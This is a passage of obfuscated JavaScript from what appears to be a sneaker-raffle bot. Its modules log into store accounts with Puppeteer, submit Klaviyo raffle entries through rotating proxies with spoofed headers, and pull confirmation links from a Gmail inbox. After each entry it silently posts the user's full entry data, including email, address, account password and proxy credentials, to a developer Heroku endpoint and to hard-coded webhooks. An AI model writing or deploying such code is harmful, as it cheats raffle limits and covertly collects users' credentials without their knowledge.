                            continue;
                        }
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0x216bca = _0x45fbb[_0x2e7c6b]['split'](':');
                        else
                            var _0x5e10a6 = Math['round'](Math['random']() * (_0x45fbb['length'] - 0x1)), _0x216bca = _0x45fbb[_0x5e10a6]['split'](':');
                        var _0x4c573d;
                        try {
                            _0x4c573d = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x216bca[0x0] + ':' + _0x216bca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4c573d = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x216bca[0x0] + ':' + _0x216bca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x8e1e59 = await _0x4c573d['newPage']();
                            await _0x8e1e59['authenticate']({
                                'username': '' + _0x216bca[0x2],
                                'password': '' + _0x216bca[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x8e1e59['setRequestInterception'](!![]), _0x8e1e59['on']('request', _0xae484b => {
                                _0xae484b['resourceType']() === 'image' || _0xae484b['resourceType']() === 'font' || _0xae484b['resourceType']() === 'media' ? _0xae484b['abort']() : _0xae484b['continue']();
                            }), await _0x8e1e59['goto']('' + _0x3f5c27[_0x2e7c6b]['Url'], { 'waitUntil': 'networkidle2' }), await _0xf987cc(0x12c), await _0x8e1e59['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x8e1e59['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xf987cc(0x7d0);
                            try {
                                await _0x8e1e59['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x8e1e59['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Logging\x20in'), await _0x8e1e59['waitForSelector']('#username'), await _0x8e1e59['type']('#username', _0x3f5c27[_0x2e7c6b]['Email']), await _0x8e1e59['waitForSelector']('#password'), await _0x8e1e59['type']('#password', _0x3f5c27[_0x2e7c6b]['Password']), await _0xf987cc(0x190), await _0x8e1e59['click']('#buttonSubmit'), await _0x8e1e59['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Getting\x20Product'), await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3f5c27[_0x2e7c6b]['Size']);
                            let _0x5c7d6b = _0x3f5c27[_0x2e7c6b]['Size']['replace']('.5', '\x201/2');
                            if (_0x5c7d6b['toUpperCase']() == 'RANDOM') {
                                const _0x25978d = await _0x8e1e59['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x578bb1 = Math['round'](Math['random']() * (_0x25978d['length'] - 0x1));
                                await _0x25978d[_0x578bb1]['click']();
                            } else
                                await _0x8e1e59['click']('button[aria-label=\x22' + _0x5c7d6b + '\x22]');
                            await _0xf987cc(0x1f4);
                            try {
                                await _0x8e1e59['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xf987cc(0x12c), console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x8e1e59['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_addressFields_firstName', _0x3f5c27[_0x2e7c6b]['FirstName']), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_addressFields_lastName', _0x3f5c27[_0x2e7c6b]['LastName']), await _0xf987cc(0x12c), await _0x8e1e59['select']('#dwfrm_raffle_addressFields_country', _0x3f5c27[_0x2e7c6b]['Country']), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_addressFields_city', _0x3f5c27[_0x2e7c6b]['City']), await _0xf987cc(0x12c);
                            _0x3f5c27[_0x2e7c6b]['Postcode'] == undefined && (_0x3f5c27[_0x2e7c6b]['Postcode'] = _0x3f5c27[_0x2e7c6b]['Zip']);
                            await _0x8e1e59['type']('#dwfrm_raffle_addressFields_postalCode', _0x3f5c27[_0x2e7c6b]['Postcode']), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_addressFields_address1', _0x3f5c27[_0x2e7c6b]['Address1']), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_addressFields_address2', _0x3f5c27[_0x2e7c6b]['HouseNumber']), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x3f5c27[_0x2e7c6b]['Address2']), await _0xf987cc(0x12c), await _0x8e1e59['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xf987cc(0x12c), await _0x8e1e59['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x3f5c27[_0x2e7c6b]['Follower']), await _0xf987cc(0x1f4), await _0x8e1e59['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20' + _0x2c0b56['blue']('Awaiting\x20Paypal\x20Payment')), await _0x8e1e59['click']('.b-paypal_button');
                            try {
                                await _0x8e1e59['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x39ccad = 'no', _0x46ba09(_0x3f5c27[_0x2e7c6b], _0x21af64), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x1b688a['succesDEVMSG']);
                                await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x1b688a['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x1b688a['succesPUBMSG']);
                                let _0x1e393d = _0x3f5c27[_0x2e7c6b];
                                try {
                                    prxdata = {
                                        'username': _0x5ad930['replace']('#', ''),
                                        'module': _0x21af64['name'],
                                        'entrydata': JSON['stringify'](_0x1e393d),
                                        'proxy': '' + _0x45fbb[_0x2e7c6b]
                                    };
                                    var _0xffdc7f = JSON['stringify'](prxdata);
                                    let _0x375bba = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x529551['post']('https://jraffles.herokuapp.com/success', _0xffdc7f, _0x375bba);
                                } catch (_0x2fdbc4) {
                                }
                            } catch (_0x46636f) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x46636f)), _0x2a5396 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x46636f;
                                var _0x5bd059 = await _0x539676(_0x3f5c27[_0x2e7c6b], _0x21af64, 'dev', !![], _0x2a5396);
                                _0x1b688a['errorDEV'] = { 'embeds': [_0x5bd059] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x1b688a['errorDEV']), await _0x215470(_0x1dec8a, _0x1b688a['errorDEV']);
                            }
                        } catch (_0x283149) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20' + _0x283149)), _0x2a5396 = '' + _0x283149;
                            var _0x5bd059 = await _0x539676(_0x3f5c27[_0x2e7c6b], _0x21af64, 'dev', !![], _0x2a5396);
                            _0x1b688a['errorDEV'] = { 'embeds': [_0x5bd059] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x1b688a['errorDEV']), await _0x215470(_0x1dec8a, _0x1b688a['errorDEV']), _0x39ccad = 'yes';
                        } finally {
                            _0x4c573d && _0x4c573d['close']();
                            if (_0x39ccad == 'yes' && _0x17e619 != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x21af64['name'] + ']\x20Task\x20' + (_0x2e7c6b + 0x1) + '\x20:\x20Retrying\x20(' + _0x17e619 + '\x20/\x205)')), _0x2e7c6b = _0x2e7c6b - 0x1, _0x17e619 = _0x17e619 + 0x1;
                                continue;
                            }
                            _0x39ccad == 'yes' && _0x17e619 >= 0x5 && (_0x46ac44(_0x3f5c27[_0x2e7c6b], _0x21af64), _0x39ccad = 'no', _0x17e619 = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['AfewDelay'] + '\x20ms'), await _0xf987cc(_0x51f80a['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x49cd63, _0x426b92, _0x1addb0) {
                    for (var _0x44ab1e = 0x0; _0x44ab1e < _0x426b92['length']; _0x44ab1e++) {
                        try {
                            await _0x3d5d40(_0x426b92, _0x44ab1e);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1c90bd(_0x1722a0, _0x51c330, _0x40004d, _0x4ba90e, _0xcce633) {
                            var _0x2078f9, _0x5e1717 = {}, _0x30ca22 = [], _0x4abee9 = {}, _0x51c7e1 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x17b5d5 = Math['round'](Math['random']() * (_0x51c7e1['length'] - 0x1));
                            !_0x4ba90e && (_0x4ba90e = {});
                            if (_0x51c330 != 'ver') {
                                _0x5c316f(_0x40004d['name'] + '\x20Task\x20' + (_0x1722a0 + 0x1) + '\x20/\x20' + _0x4ba90e['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd), await _0x3d5d40(_0x4ba90e, _0x1722a0), _0x5e1717 = _0x40004d['data'], _0x5e1717['data']['attributes']['email'] = '' + _0x4ba90e[_0x1722a0]['Email'];
                                if (_0x4ba90e[_0x1722a0]['Size'] == 'RANDOM') {
                                }
                                _0x5e1717['data']['attributes']['properties']['$first_name'] = '' + _0x4ba90e[_0x1722a0]['FirstName'], _0x5e1717['data']['attributes']['properties']['$last_name'] = '' + _0x4ba90e[_0x1722a0]['LastName'], _0x5e1717['data']['attributes']['properties']['$address1'] = _0x4ba90e[_0x1722a0]['Address1'] + '\x20' + _0x4ba90e[_0x1722a0]['Address2'] + '\x20' + _0x4ba90e[_0x1722a0]['HouseNumber'], _0x5e1717['data']['attributes']['properties']['$zip'] = '' + _0x4ba90e[_0x1722a0]['Zip'], _0x5e1717['data']['attributes']['properties']['$city'] = '' + _0x4ba90e[_0x1722a0]['City'], _0x5e1717['data']['attributes']['properties']['$country'] = '' + _0x4ba90e[_0x1722a0]['Country'], _0x4ba90e[_0x1722a0]['Size'] == 'RANDOM' ? _0x5e1717['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x51c7e1[_0x17b5d5] : _0x5e1717['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4ba90e[_0x1722a0]['Size'], _0x5e1717['data']['attributes']['properties']['$phone_number'] = '' + _0x4ba90e[_0x1722a0]['Phone'], _0x5e1717['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4ba90e[_0x1722a0]['Follower'];
                            }
                            if (_0x51f80a['useRandomProxy'] = ![])
                                var _0x4d6201 = _0xcce633[_0x1722a0]['split'](':');
                            else
                                var _0x3100c4 = Math['round'](Math['random']() * (_0xcce633['length'] - 0x1)), _0x4d6201 = _0xcce633[_0x3100c4]['split'](':');
                            var _0x17ed5c = {
                                'jar': _0x4e0120,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x40004d['url'],
                                'headers': _0x40004d['headers'],
                                'body': JSON['stringify'](_0x5e1717),
                                'proxy': 'http://' + _0x4d6201[0x2] + ':' + _0x4d6201[0x3] + '@' + _0x4d6201[0x0] + ':' + _0x4d6201[0x1]
                            };
                            return _0x51c330 != 'ver' && (_0x17ed5c['url'] = _0x40004d['url'], _0x17ed5c['headers'] = _0x40004d['headers']), _0x51c330 == 'ver' && (_0x17ed5c['method'] = 'GET'), new Promise(function (_0x261279, _0x52e1c5) {
                                callback = async (_0x715739, _0x48be9b, _0x17cd07) => {
                                    if (!_0x715739 && _0x48be9b['statusCode'] == 0xca || !_0x715739 && _0x48be9b['statusCode'] == 0xc8) {
                                        if (_0x51c330 != 'ver') {
                                            var _0x3a3336 = await _0x539676(_0x4ba90e[_0x1722a0], _0x40004d, 'dev', ![]), _0x1bfe96 = await _0x539676(_0x4ba90e[_0x1722a0], _0x40004d, 'pub', ![]);
                                            const _0x5a36fb = {
                                                'succesDEVMSG': { 'embeds': [_0x3a3336] },
                                                'succesPUBMSG': { 'embeds': [_0x1bfe96] }
                                            };
                                            let _0x3ee2bc = _0x4ba90e[_0x1722a0];
                                            try {
                                                prxdata = {
                                                    'username': _0x5ad930['replace']('#', ''),
                                                    'module': _0x40004d['name'],
                                                    'entrydata': JSON['stringify'](_0x3ee2bc),
                                                    'proxy': '' + _0xcce633[_0x1722a0]
                                                };
                                                var _0x2f8d32 = JSON['stringify'](prxdata);
                                                let _0x4106ca = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x2f8d32, _0x4106ca);
                                            } catch (_0x3b03f1) {
                                            }
                                            if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                                try {
                                                    await _0x215470(_0x51f80a['webhook'], _0x5a36fb['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x5a36fb['succesDEVMSG']), await _0xf987cc(0xc8);
                                            try {
                                                await _0x215470(_0x255a14, _0x5a36fb['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x46ba09(_0x4ba90e[_0x1722a0], _0x40004d);
                                        }
                                        _0x261279(console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x40004d['name'] + ']\x20Task\x20' + (_0x1722a0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x51c330 != 'ver') {
                                            var _0x4f2f12 = '' + _0x715739, _0x58296d = await _0x539676(_0x4ba90e[_0x1722a0], _0x40004d, 'dev', !![], _0x4f2f12), _0x267f85 = {};
                                            _0x267f85['errorDEV'] = { 'embeds': [_0x58296d] }, _0x46ac44(_0x4ba90e[_0x1722a0], _0x40004d), _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x267f85['errorDEV']), await _0x215470(_0x1dec8a, _0x267f85['errorDEV']);
                                        }
                                        _0x52e1c5(console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x40004d['name'] + ']\x20Task\x20' + (_0x1722a0 + 0x1) + ':\x20' + _0x715739)));
                                    }
                                };
                                try {
                                    _0x51c330 != 'ver' && console['log'](_0x5c3ac1() + '\x20[' + _0x40004d['name'] + ']\x20Task\x20' + (_0x1722a0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5e1717['data']['attributes']['email']), _0x497c42(_0x17ed5c, callback);
                                } catch (_0xc2176b) {
                                    console['log'](_0x5c3ac1() + '\x20Task\x20' + (_0x1722a0 + 0x1) + ':\x20' + _0xc2176b);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1c90bd(_0x44ab1e, 'nor', _0x49cd63, _0x426b92, _0x1addb0), console['log'](_0x5c3ac1() + '\x20[' + _0x49cd63['name'] + ']\x20Sleeping\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        } catch (_0x2fbb4d) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1734cc, _0x22a1ce, _0x540054) {
                    var _0x4bba88 = [], _0x5daf92 = ![];
                    async function _0x19cc62() {
                        var _0x360967 = new _0x2a51ab({
                            'user': _0x51f80a['masterMail'],
                            'password': _0x51f80a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x33291d(_0x323703) {
                            _0x360967['openBox']('INBOX', ![], _0x323703);
                        }
                        _0x360967['once']('ready', function () {
                            _0x33291d(function (_0x40cc0d, _0x3e1bff) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x40cc0d)
                                    throw _0x40cc0d;
                                _0x360967['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x1bc312, _0x19842b) {
                                    if (!_0x19842b || !_0x19842b['length'])
                                        console['log'](_0x5c3ac1() + '\x20[' + _0x1734cc['name'] + ']\x20No\x20mails\x20found'), _0x360967['end']();
                                    else {
                                        var _0x26f3ba = _0x360967['seq']['fetch'](_0x19842b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x26f3ba['on']('message', function (_0x27d407, _0x255bb5) {
                                            var _0x2c42fe = '(#' + _0x255bb5 + ')\x20';
                                            _0x27d407['on']('body', function (_0x37c8ea, _0x4d05e8) {
                                                _0xfebb(_0x37c8ea, (_0x436447, _0x1d3f62) => {
                                                    var _0x5dc6a8 = _0x1d3f62['text']['split']('(')[0x1], _0x2776d4 = _0x5dc6a8['split'](')')[0x0];
                                                    _0x4bba88['push'](_0x2776d4);
                                                });
                                            }), _0x27d407['once']('end', function () {
                                            });
                                        }), _0x26f3ba['once']('error', function (_0x705f1c) {
                                            console['log']('Fetch\x20error:\x20' + _0x705f1c), _0x5daf92 = !![];
                                        }), _0x26f3ba['once']('end', function () {
                                            _0x360967['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x360967['once']('error', function (_0x30766b) {
                            console['log'](_0x2c0b56['red'](_0x30766b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5daf92 = !![];
                        }), _0x360967['once']('end', async function () {
                            _0x5daf92 = !![];
                        }), _0x360967['connect']();
                    }
                    async function _0x5b24ab(_0x240798, _0x19617f, _0x2d9a60) {
                        for (var _0x494e7d = 0x0; _0x494e7d < _0x19617f['length']; _0x494e7d++) {
                            async function _0x591810(_0x1d3fa0, _0x19048b, _0x47eb02, _0x4c418b, _0x227b12) {
                                var _0xfe9b15, _0x15f5f4 = {}, _0x35d6c5 = [], _0x2e6049 = {}, _0x3cdbaf = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1ee8a4 = Math['round'](Math['random']() * (_0x3cdbaf['length'] - 0x1));
                                _0x4c418b[_0x1d3fa0]['Size'] == 'RANDOM' && (_0x4c418b[_0x1d3fa0]['Size'] = _0x3cdbaf[_0x1ee8a4]);
                                !_0x4c418b && (_0x4c418b = {});
                                if (_0x51f80a['useRandomProxy'] = ![])
                                    var _0x1939a1 = _0x227b12[_0x1d3fa0]['split'](':');
                                else
                                    var _0x1636a9 = Math['round'](Math['random']() * (_0x227b12['length'] - 0x1)), _0x1939a1 = _0x227b12[_0x1636a9]['split'](':');
                                var _0x2340d9 = {
                                    'jar': _0x4e0120,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x47eb02['url'],
                                    'headers': _0x47eb02['headers'],
                                    'body': JSON['stringify'](_0x15f5f4),
                                    'proxy': 'http://' + _0x1939a1[0x2] + ':' + _0x1939a1[0x3] + '@' + _0x1939a1[0x0] + ':' + _0x1939a1[0x1]
                                };
                                return _0x19048b != 'ver' && (_0x2340d9['url'] = _0x47eb02['url'], _0x2340d9['headers'] = _0x47eb02['headers']), _0x19048b == 'ver' && (_0x2340d9['method'] = 'GET', _0x2340d9['url'] = _0x4c418b[_0x1d3fa0]), new Promise(function (_0x309ec2, _0x5df621) {
                                    callback = async (_0x2b5a7c, _0x3e80cc, _0x460fbe) => {
                                        if (!_0x2b5a7c && _0x3e80cc['statusCode'] == 0xca || !_0x2b5a7c && _0x3e80cc['statusCode'] == 0xc8) {
                                            if (_0x19048b != 'ver') {
                                                var _0x1baf9f = await _0x539676(_0x4c418b[_0x1d3fa0], _0x47eb02, 'dev', ![]), _0x1e20ce = await _0x539676(_0x4c418b[_0x1d3fa0], _0x47eb02, 'pub', ![]);
                                                const _0x223670 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1baf9f] },
                                                    'succesPUBMSG': { 'embeds': [_0x1e20ce] }
                                                };
                                                if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                                    try {
                                                        await _0x215470(_0x51f80a['webhook'], _0x223670['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x223670['succesDEVMSG']), await _0xf987cc(0xc8);
                                                try {
                                                    await _0x215470(_0x255a14, _0x223670['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x46ba09(_0x4c418b[_0x1d3fa0], _0x47eb02);
                                            }
                                            _0x309ec2(console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x47eb02['name'] + ']\x20Task\x20' + (_0x1d3fa0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x19048b != 'ver') {
                                                var _0x3f3a56 = '' + _0x2b5a7c, _0x4836ac = await _0x539676(_0x4c418b[_0x1d3fa0], _0x47eb02, 'dev', !![], _0x3f3a56), _0x4e0b60 = {};
                                                _0x4e0b60['errorDEV'] = { 'embeds': [_0x4836ac] }, _0x46ac44(_0x4c418b[_0x1d3fa0], _0x47eb02), _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x4e0b60['errorDEV']), await _0x215470(_0x1dec8a, _0x4e0b60['errorDEV']);
                                            }
                                            _0x5df621(console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x47eb02['name'] + ']\x20Task\x20' + (_0x1d3fa0 + 0x1) + ':\x20' + _0x2b5a7c)));
                                        }
                                    };
                                    try {
                                        _0x19048b != 'ver' ? console['log'](_0x5c3ac1() + '\x20[' + _0x47eb02['name'] + ']\x20Task\x20' + (_0x1d3fa0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x15f5f4['data']['attributes']['email']) : console['log'](_0x5c3ac1() + '\x20[' + _0x47eb02['name'] + ']\x20Task\x20' + (_0x1d3fa0 + 0x1) + ':\x20Fetching\x20Response'), _0x497c42(_0x2340d9, callback);
                                    } catch (_0x180fba) {
                                        console['log'](_0x5c3ac1() + '\x20Task\x20' + (_0x1d3fa0 + 0x1) + ':\x20' + _0x180fba);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x591810(_0x494e7d, 'ver', _0x240798, _0x19617f, _0x2d9a60), console['log'](_0x5c3ac1() + '\x20[' + _0x240798['name'] + ']\x20Sleeping\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                            } catch (_0x4e6a3f) {
                            }
                        }
                    }
                    try {
                        _0x19cc62();
                        while (!_0x5daf92) {
                            await _0xf987cc(0xbb8);
                        }
                        console['log']('Found\x20' + _0x4bba88['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xf987cc(0x9c4);
                    }
                    await _0x5b24ab(_0x1734cc, _0x4bba88, _0x540054);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
